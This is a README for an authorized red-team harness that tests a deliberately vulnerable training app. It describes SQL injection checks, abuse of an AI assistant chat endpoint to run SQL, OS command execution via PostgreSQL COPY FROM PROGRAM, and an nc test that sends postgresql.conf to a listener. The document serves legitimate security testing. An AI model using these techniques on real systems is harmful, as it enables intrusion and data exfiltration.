# Vulnerable app red-team harness

This repository contains a bounded HTTP test harness for the intentionally
vulnerable training application in `../Vulnerable-AI-KB-app`.

Use it only against the local lab deployment or another target for which you
have explicit authorization. The harness sends fixed checks; it does not scan,
brute-force, modify database data, or send email. Its optional egress check does
send `postgresql.conf` to the configured lab IP and port.

## Run

Start the vulnerable app, then run:

```bash
python3 red_team.py \
  --target http://127.0.0.1:3000 \
  --egress-ip 192.0.2.20
```

Both `--target` and `--egress-ip` are required. To test an explicitly authorized
non-loopback lab host, add `--allow-nonlocal`:

```bash
python3 red_team.py \
  --target http://192.0.2.10:3000 \
  --egress-ip 192.0.2.20 \
  --allow-nonlocal
```

Save evidence for later comparison:

```bash
python3 red_team.py --output reports/baseline.json
```

The report is sanitized before writing. Values that look like email addresses,
government identifiers, payment cards, credentials, or bearer tokens are
redacted. The process exits with status `1` when a vulnerability is confirmed
or an expected check fails.

## Checks

- Health and database readiness.
- Normal personal-record lookup for a baseline.
- Boolean SQL injection against `/api/me/records`.
- Boolean SQL injection against `/api/clients`.
- UNION SQL injection that tests whether sensitive-data values can cross the
  endpoint boundary.
- Direct SQL execution through `/api/assistant/chat` using a read-only count
  query. This check does not require an OpenAI key because the vulnerable app
  intentionally supports SQL-shaped input directly.
- PostgreSQL `COPY FROM PROGRAM` through `/api/assistant/chat`, using a
  directory-listing command to demonstrate OS command execution.
- A separate configurable `nc` egress test through `COPY FROM PROGRAM`, which
  starts `ncat -l 9000` on the red-team host immediately before the request and
  sends `postgresql.conf` to the selected IP and port `9000`. Run this only
  against an explicitly authorized receiver in the controlled lab. The
  listener output is captured without printing the file contents.

Use `--skip-assistant-sql` to omit all assistant-related checks.
